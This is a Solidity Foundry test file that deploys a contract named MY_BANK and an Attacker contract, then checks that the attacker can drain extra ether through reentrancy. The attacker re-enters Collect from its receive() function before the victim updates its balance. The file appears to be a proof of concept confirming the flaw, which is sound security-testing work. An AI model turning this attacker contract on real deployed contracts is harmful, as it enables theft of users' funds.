
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max / 4);

        vm.deal(address(this), attackVal * 4);
        vm.deal(address(_contractUnderTest), attackVal * 4);
        vm.deal(address(_attacker), attackVal * 4);

        vm.warp(block.timestamp + 1 days);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = MY_BANK(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Initial deposit into the bank under attacker identity
        _victim.Put{value: val}(block.timestamp - 1);
    }

    function attack(uint256 val) public {
        // Ensure unlockTime is in the past so Collect condition passes
        _victim.Acc(address(this)).unlockTime;
        initialSnapshot = address(this).balance;

        // Trigger first Collect; this will call back into receive()
        _victim.Collect(val);

        // Success if we received more than our initial balance (at least 2 Collects)
        if (address(this).balance > initialSnapshot + val / 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            // Re-enter before balance is reduced in victim
            _victim.Collect(storedAttackVal);
        }
    }
}
